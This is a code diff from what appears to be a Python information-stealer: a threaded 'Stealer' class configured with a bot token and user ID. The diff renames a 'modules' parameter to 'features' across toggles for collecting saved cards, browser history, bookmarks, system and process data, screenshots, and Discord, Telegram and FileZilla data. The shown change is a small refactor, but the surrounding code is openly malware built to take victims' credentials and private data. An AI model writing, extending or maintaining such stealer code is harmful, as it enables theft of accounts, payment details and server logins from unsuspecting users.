@@ -10,7 +10,7 @@ from .enums import Features, Utils
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, modules: list = [Features.all], utils: list = []):
+    def __init__(self, token: str, user_id: int, features: list = [Features.all], utils: list = []):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
@@ -26,7 +26,7 @@ class Stealer(Thread):
             Features.cards,
             Features.history,
             Features.bookmarks
-        ] if module in modules or Features.all in modules]
+        ] if module in features or Features.all in features]
 
         self.methods = [
             {
@@ -95,7 +95,7 @@ class Stealer(Thread):
                     "System",
                     self.errors
                 ),
-                "status": True if (Features.system in modules or Features.all in modules) else False
+                "status": True if (Features.system in features or Features.all in features) else False
             },
             {
                 "object": Processes(
@@ -103,7 +103,7 @@ class Stealer(Thread):
                     "System",
                     self.errors
                 ),
-                "status": True if (Features.processes in modules or Features.all in modules) else False
+                "status": True if (Features.processes in features or Features.all in features) else False
             },
             {
                 "object": Screenshot(
@@ -111,7 +111,7 @@ class Stealer(Thread):
                     "System",
                     self.errors
                 ),
-                "status": True if (Features.screenshot in modules or Features.all in modules) else False
+                "status": True if (Features.screenshot in features or Features.all in features) else False
             },
             {
                 "object": Discord(
@@ -119,7 +119,7 @@ class Stealer(Thread):
                     r"Programs\Discord",
                     self.errors
                 ),
-                "status": True if (Features.discord in modules or Features.all in modules) else False
+                "status": True if (Features.discord in features or Features.all in features) else False
             },
             {
                 "object": Telegram(
@@ -127,7 +127,7 @@ class Stealer(Thread):
                     r"Programs\Telegram",
                     self.errors
                 ),
-                "status": True if (Features.telegram in modules or Features.all in modules) else False
+                "status": True if (Features.telegram in features or Features.all in features) else False
             },
             {
                 "object": FileZilla(
@@ -135,7 +135,7 @@ class Stealer(Thread):
                     r"Programs\FileZilla",
                     self.errors
                 ),
-                "status": True if (Features.filezilla in modules or Features.all in modules) else False
+                "status": True if (Features.filezilla in features or Features.all in features) else False
             }
         ]
 
